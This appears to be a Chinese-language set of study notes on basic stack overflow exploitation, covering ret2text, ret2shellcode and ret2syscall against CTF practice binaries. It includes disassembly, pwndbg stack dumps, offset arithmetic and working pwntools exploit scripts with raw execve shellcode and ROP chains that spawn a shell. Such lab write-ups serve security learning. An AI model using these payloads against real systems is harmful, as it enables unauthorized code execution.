# 简单栈溢出

## ret2text

ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。

这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。

IDA查看,使用了get()函数,可能存在栈溢出,同时在子函数secure中存在 `system(/bin/sh)`,对应地址 `0x8048763`.我们只要让栈溢出填充返回地址为目标地址即可.

```
.text:080486A7 8D 44 24 1C                   lea     eax, [esp+80h+s]
.text:080486AB 89 04 24                      mov     [esp], eax                      ; s
.text:080486AE E8 AD FD FF FF                call    _gets
.text:080486AE

.text:0804863A C7 04 24 63 87 04 08          mov     dword ptr [esp], offset command ; "/bin/sh"
.text:08048641 E8 4A FE FF FF                call    _system
.text:08048641

```

gdb动调:

先在get处打断点

```bash
pwndbg> b *0x80486A7
Breakpoint 1 at 0x80486a7: file ret2text.c, line 24.
```

填充数据后查看栈内数据情况

```c
pwndbg> n
aaaaaaaaaaaaaaaa
...
pwndbg> stack 40
```

---

<pre><span style="color:#EC0101"><b>pwndbg> </b></span>stack 40
00:0000│ <b>esp</b> <span style="color:#FEA44C">0xffffcb40</span> —▸ <span style="color:#FEA44C">0xffffcb5c</span> ◂— 'aaaaaaaaaaaaaaaa'
01:0004│ <b>   </b> <span style="color:#FEA44C">0xffffcb44</span> ◂— 0x0
02:0008│ <b>   </b> <span style="color:#FEA44C">0xffffcb48</span> ◂— 0x1
03:000c│ <b>   </b> <span style="color:#FEA44C">0xffffcb4c</span> ◂— 0x0
04:0010│ <b>   </b> <span style="color:#FEA44C">0xffffcb50</span> —▸ <span style="color:#9755B3">0xf7ffdb8c</span> —▸ <span style="color:#9755B3">0xf7fc26f0</span> —▸ <span style="color:#9755B3">0xf7ffda20</span> ◂— 0x0
05:0014│ <b>   </b> <span style="color:#FEA44C">0xffffcb54</span> ◂— 0x1
06:0018│ <b>   </b> <span style="color:#FEA44C">0xffffcb58</span> —▸ <span style="color:#9755B3">0xf7fc2720</span> —▸ <span style="color:#D41919">0x8048354</span> ◂— <span style="color:#AFD700">inc</span><span style="color:#FFFFFF"> </span><span style="color:#5FD7FF">edi</span> /* 'GLIBC_2.0' */
07:001c│ <b>eax</b> <span style="color:#FEA44C">0xffffcb5c</span> ◂— 'aaaaaaaaaaaaaaaa'
... ↓        3 skipped
0b:002c│ <b>   </b> <span style="color:#FEA44C">0xffffcb6c</span> ◂— 0x0
0c:0030│ <b>   </b> <span style="color:#FEA44C">0xffffcb70</span> ◂— 0xffffffff
0d:0034│ <b>   </b> <span style="color:#FEA44C">0xffffcb74</span> —▸ 0xf7fca67c ◂— 0xe
0e:0038│ <b>   </b> <span style="color:#FEA44C">0xffffcb78</span> —▸ <span style="color:#9755B3">0xf7ffd5e8 (_rtld_global+1512)</span> —▸ 0xf7fca000 ◂— 0x464c457f
0f:003c│ <b>   </b> <span style="color:#FEA44C">0xffffcb7c</span> —▸ <span style="color:#FEA44C">0xffffdfd6</span> ◂— '/home/taotie/Desktop/pwn/ret2text'
10:0040│ <b>   </b> <span style="color:#FEA44C">0xffffcb80</span> —▸ 0xf7ffcff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x32f34
11:0044│ <b>   </b> <span style="color:#FEA44C">0xffffcb84</span> ◂— 0xc /* '\x0c' */
12:0048│ <b>   </b> <span style="color:#FEA44C">0xffffcb88</span> ◂— 0x0
... ↓        3 skipped
16:0058│ <b>   </b> <span style="color:#FEA44C">0xffffcb98</span> ◂— 0x13
17:005c│ <b>   </b> <span style="color:#FEA44C">0xffffcb9c</span> —▸ <span style="color:#9755B3">0xf7fc2400</span> —▸ 0xf7c00000 ◂— 0x464c457f
18:0060│ <b>   </b> <span style="color:#FEA44C">0xffffcba0</span> —▸ 0xf7c216ac ◂— 0x21e04c
19:0064│ <b>   </b> <span style="color:#FEA44C">0xffffcba4</span> —▸ <span style="color:#D41919">0xf7fd9e51 (_dl_fixup+225)</span> ◂— <span style="color:#AFD700">mov</span><span style="color:#FFFFFF"> </span><span style="color:#5FD7FF">dword</span><span style="color:#FFFFFF"> </span><span style="color:#5FD7FF">ptr</span><span style="color:#FFFFFF"> [</span><span style="color:#5FD7FF">esp</span><span style="color:#FFFFFF"> + </span><span style="color:#AF87FF">0x28</span><span style="color:#FFFFFF">], </span><span style="color:#5FD7FF">eax</span>
1a:0068│ <b>   </b> <span style="color:#FEA44C">0xffffcba8</span> —▸ 0xf7c1c9a2 ◂— '_dl_audit_preinit'
1b:006c│ <b>   </b> <span style="color:#FEA44C">0xffffcbac</span> —▸ <span style="color:#9755B3">0xf7fc2400</span> —▸ 0xf7c00000 ◂— 0x464c457f
1c:0070│ <b>   </b> <span style="color:#FEA44C">0xffffcbb0</span> —▸ <span style="color:#FEA44C">0xffffcbe0</span> —▸ 0xf7e1dff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21dd8c
1d:0074│ <b>   </b> <span style="color:#FEA44C">0xffffcbb4</span> —▸ <span style="color:#9755B3">0xf7fc25d8</span> —▸ <span style="color:#9755B3">0xf7ffdb8c</span> —▸ <span style="color:#9755B3">0xf7fc26f0</span> —▸ <span style="color:#9755B3">0xf7ffda20</span> ◂— ...
1e:0078│ <b>   </b> <span style="color:#FEA44C">0xffffcbb8</span> —▸ <span style="color:#9755B3">0xf7fc2ab0</span> —▸ 0xf7c1f22d ◂— 'GLIBC_PRIVATE'
1f:007c│ <b>   </b> <span style="color:#FEA44C">0xffffcbbc</span> ◂— 0x1
20:0080│ <b>   </b> <span style="color:#FEA44C">0xffffcbc0</span> ◂— 0x1
21:0084│ <b>   </b> <span style="color:#FEA44C">0xffffcbc4</span> ◂— 0x0
22:0088│ <b>ebp</b> <span style="color:#FEA44C">0xffffcbc8</span> ◂— 0x0
23:008c│ <b>   </b> <span style="color:#FEA44C">0xffffcbcc</span> —▸ <span style="color:#D41919">0xf7c237c5 (__libc_start_call_main+117)</span> ◂— <span style="color:#AFD700">add</span><span style="color:#FFFFFF"> </span><span style="color:#5FD7FF">esp</span><span style="color:#FFFFFF">, </span><span style="color:#AF87FF">0x10</span>
24:0090│ <b>   </b> <span style="color:#FEA44C">0xffffcbd0</span> ◂— 0x1
25:0094│ <b>   </b> <span style="color:#FEA44C">0xffffcbd4</span> —▸ <span style="color:#FEA44C">0xffffcc84</span> —▸ <span style="color:#FEA44C">0xffffceac</span> ◂— '/home/taotie/Desktop/pwn/ret2text'
26:0098│ <b>   </b> <span style="color:#FEA44C">0xffffcbd8</span> —▸ <span style="color:#FEA44C">0xffffcc8c</span> —▸ <span style="color:#FEA44C">0xffffcece</span> ◂— 'GDMSESSION=gnome'
27:009c│ <b>   </b> <span style="color:#FEA44C">0xffffcbdc</span> —▸ <span style="color:#FEA44C">0xffffcbf0</span> —▸ 0xf7e1dff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21dd8c
</pre>

可以看到目前栈顶指针在 `0xffffcb40`,栈底指针在 `0xffffcbc8`,输入点的位置在 `0xffffcb5c`.输入点相对于返回地址的偏移值为 `0xffffcbc8-0xffffcb5c+0x4=0x6c+0x4=0x70`.

编写exp:

```python
from pwn import *

sh = process('./ret2text')
target = 0x804863a

sh.sendline(b'A' * (0x70) + p32(target))
sh.interactive()
```

## ret2shellcode

ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。

在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。

IDA看一下文件,发现使用了gets()函数给变量`s`赋值,下一步会将`s`的值复制给`buf2`,`buf2`位于bss段:
`.bss:0804A080 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+buf2 db 64h dup(?)                      ; DATA XREF: main+7B↑o`

通过gdb动态调试看一下有没有执行权限.`vmmap`查询当前系统调用库:

```
0x804a000  0x804b000 rw-p     1000   1000 /home/taotie/Desktop/pwnstudy/StackOverflow/ret2shellcode/ret2shellcode
```

可以看到`buf2`所在段可读写可执行,那么就可以栈溢出写入shellcode并且控制程序执行bss处的shellcode.
正常动调分析需要填充`0xffffcb18 - 0xffffcaac +0x4 = 112`的数据到返回地址,而前面的shellcode占44字节,则需要填充68字节的垃圾数据,返回地址应该为buf2的地址.编写exp:

``` python
from pwn import *

io = process("./ret2shellcode")
shellcode = asm(shellcraft.sh())
buf2 = 0x0804A080
payload = shellcode + b"A" * 68 + p32(buf2)

io.recvline()
io.sendline(payload)
io.interactive()
```

### sniperoj-pwn100-shellcode-x86-64
首先checksec一下:

<pre><span style="color:#277FFF"><b>$</b></span> <span style="color:#49AEE6">checksec</span> <b>sniperoj-pwn100-shellcode-x86-64</b> 
[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/taotie/Desktop/pwnstudy/StackOverflow/ret2shellcode/sniperoj-pwn100-shellcode-x86-64&apos;
    Arch:     amd64-64-little
    RELRO:    <span style="color:#FEA44C">Partial RELRO</span>
    Stack:    <span style="color:#D41919">No canary found</span>
    NX:       <span style="color:#D41919">NX disabled</span>
    PIE:      <span style="color:#5EBDAB">PIE enabled</span>
    RWX:      <span style="color:#D41919">Has RWX segments</span>
</pre>

发现仅仅开启了随机地址,通过IDA反编译分析:
给`buf`变量一共分配了0x10大小的空间,而`read()`却会读取0x40,我们可以通过栈溢出将shellcode写入程序,同时更改read()函数返回地址为shellcode地址即可.

``` c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 buf[2]; // [rsp+0h] [rbp-10h] BYREF

  buf[0] = 0LL;
  buf[1] = 0LL;
  setvbuf(_bss_start, 0LL, 1, 0LL);
  puts("Welcome to Sniperoj!");
  printf("Do your kown what is it : [%p] ?\n", buf);
  puts("Now give me your answer : ");
  read(0, buf, 0x40uLL);
  return 0;
}
```

接下来分析数据,虽然开启了随机地址,但是程序自己给出了buf的起始地址,buf一共长0x10,再加8字节到返回地址,返回地址占8字节,则shellcode的起始地址应该为`buf_addr + 0x10 + 0x8 + 0x8 = buf_addr + 0x20`,即返回地址应该填充`buf_addr + 0x20`.
read一共读取0x40字节,填充数据~返回地址一共占用0x20字节,则剩下0x20(32)字节用于写入shellcode.我们需要一个短点的shellcode:

> https://www.exploit-db.com/shellcodes/47008（22字节）
> https://www.exploit-db.com/shellcodes/46907（23字节）
> https://www.exploit-db.com/shellcodes/43550（24字节）
> https://www.exploit-db.com/shellcodes/42179（24字节）
> https://www.exploit-db.com/shellcodes/41883（31字节）

编写exp:

``` python
from pwn import *

shellcode=b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"# 23字节的shellcode

p = process('./sniperoj-pwn100-shellcode-x86-64')
p.recvuntil('[')
buf_addr = p.recvuntil(']', drop = True)# 获取buf的地址
print(int(buf_addr,16))
fillw_addr = int(buf_addr,16) + 0x20 # 指向shellcode的地址
p.sendline(0x18*b'a' + p64(fillw_addr) + shellcode)
p.interactive()
```

## ret2syscall

ret2syscall，即控制程序执行系统调用，获取 shell。

背景知识:
- ret:可以理解为取栈顶数据作为下次跳转的位置
- gadgets:在程序中的指令片段，有时我们为了达到我们执行命令的目的，需要多个gadget来完成我们的功能。gadget最后一般都有ret,因为我们需要将程序控制权(EIP)给下一个gadget.即让程序自动持续的选择堆栈中的指令依次执行。
- ropgadgets：一个pwntools的一个命令行工具，用来具体寻找gadgets的。例如：我们从pop、ret序列当中寻找其中的eax:`ROPgadget --binary ./pwn --only "pop|ret" | grep "eax"`
- 系统调用号:在linux系统中，函数的调用是有一个系统调用号的。我们实验要调用的execve("/bin/sh",null,null)函数其系统调用号是11，即十六进制0xb。

系统调用:
以执行`execve("/bin/sh",null,null)`为例子,其函数调用过程为:

- execve()的系统调用号为0xb,则eax为0xb
- 第一个参数:"/bin/sh",则ebx应该指向"/bin/sh"的地址
- 第二个参数:null,则ecx为0
- 第三个参数:null,则edx为0

当把上述寄存器数据更改后,执行`int 0x80`即可进行系用调用.

在这里我们可以使用pop函数将栈中数据更改到对应的寄存器,然后使用ret函数继续执行下一条命令.通过ROPgadget寻找可以更改对应寄存器的指令地址和字符串地址,通过gadgets完成一系列指令的操作,最终实现系统调用,exp如下:

``` python
from pwn import *

sh = process('./rop')
pop_eax_ret = 0x080bb196
pop_ecx_ebx_ret = 0x0806eb91
pop_edx_ret = 0x0806eb6a
binsh = 0x080be408
int_0x80 = 0x08049421
payload = flat(['a'* 0x70 , pop_eax_ret, 0xb, pop_ecx_ebx_ret, 0, binsh, pop_edx_ret, int_0x80])

sh.sendline(payload)
sh.interactive()
```

### syscall2

同类型例题:

``` cpp
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/syscall.h>
void exploit()
{
    system("/bin/sh");
}
void func()
{
char str[0x20];
read(0,str,0x50);
}
int main()
{
func();
return 0;
}
```

编译命令:`gcc -no-pie -fno-stack-protector  -static -m32  -o syscall2 syscall2.c`

在使用命令:`ROPgadget --binary ./syscall2 --only "pop|ret" | grep "edx"`时找不到完全符合要求的指令,只能找到:`0x080531f8: pop edx; mov eax, 0x16; pop ebx; pop esi; ret; `.执行该命令时mov会更改eax的值,所以为了方便编写exp,可以`pop eax`放到后面执行,这样就不会担心eax的值改来改去了.

另外,ROPgadget似乎有点不靠谱,明明存在`0x0804901e: pop ebx; ret; `,用`ROPgadget --binary ./syscall2 --only "pop|ret" | grep "ebx"`搜索不到,用`ropper --file syscall2 --search "pop ebx"`才搜索得到.

exp:

``` python
from pwn import *

sh = process('./syscall2')

pop_ecx_add_ret = 0x08050abf
pop_edx_mov_ebx_esi_ret = 0x080531f8
pop_eax_ret = 0x080bb196
binsh = 0x080b1014
int_0x80 = 0x08049ab2
payload = flat(['a'* 0x2c, pop_ecx_add_ret, 0, pop_edx_mov_ebx_esi_ret, 0, binsh, pop_eax_ret, 0xb, int_0x80])

sh.sendline(payload)
sh.interactive()
```